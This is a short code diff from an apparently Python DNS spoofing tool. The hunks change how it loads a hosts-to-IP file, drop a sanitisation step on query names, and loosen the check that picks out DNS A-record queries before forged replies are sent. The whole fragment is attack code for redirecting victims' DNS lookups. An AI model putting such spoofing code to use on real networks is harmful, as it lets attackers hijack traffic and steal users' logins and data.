@@ -54,12 +54,13 @@ def load_file(file_path):
     with open(file_path, "r") as hf:
         for line in hf:
             ip, host_name = [i for i in line.strip().split(" ") if i]
+            host_name = host_name+'.'
             hf_d[host_name] = ip
 
 
 def packet_spoofing(pack):
     if is_valid_packet(pack):
-        query_name = sanitize(pack[DNSQR].qname)
+        query_name = pack[DNSQR].qname
         ip_to_redirect = get_ip_to_redirect(query_name)
         if ip_to_redirect:
             sf_pkt = IP(dst=pack[IP].src, src=pack[IP].dst) / \
@@ -75,7 +76,7 @@ def sanitize(query_name):
 
 
 def is_valid_packet(pack):
-    if pack.haslayer(DNSQR) and pack.haslayer(DNS) and pack[DNS].qr == 0 and pack[DNSQR].qtype == 1:
+    if pack.haslayer(DNSQR) and pack[DNS].qr == 0 and pack[DNSQR].qtype == 1:
         return True
     return False
 
